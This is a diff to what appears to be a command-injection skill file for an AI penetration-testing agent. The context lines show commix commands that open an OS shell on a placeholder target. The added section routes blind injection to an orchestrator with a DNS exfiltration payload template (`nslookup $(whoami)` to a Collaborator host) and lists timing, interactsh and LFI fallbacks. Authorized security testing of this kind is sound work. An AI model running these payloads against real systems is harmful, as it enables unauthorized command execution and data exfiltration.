@@ -617,3 +617,21 @@ python commix.py -u "http://TARGET/page?ip=127.0.0.1" --os-shell
 # With specific technique
 python commix.py -u "http://TARGET/page?ip=127.0.0.1" -t time-based
 ```
+
+## Collaborator Exit (Burp co-pilot path)
+
+If `engagement/state.md` contains `burp-copilot: active` AND you reach a blind
+command injection testing point that requires OOB callbacks, return to the
+orchestrator with:
+
+**Routing Recommendations:**
+- OOB needed: blind command injection at [endpoint]/[parameter]
+- Payload template: [injection payload with COLLABORATOR_URL placeholder — e.g., `; nslookup $(whoami).COLLABORATOR_URL`]
+- Interaction type: dns|http
+- Context: [what a callback confirms — e.g., "OS command execution confirmed via DNS exfiltration"]
+
+The orchestrator handles Collaborator payload generation and interaction
+polling in the main context, then re-invokes this skill with results.
+
+If `burp-copilot` is NOT active, use existing fallbacks (time-based via
+`sleep`/`ping`, interactsh, file write + LFI).
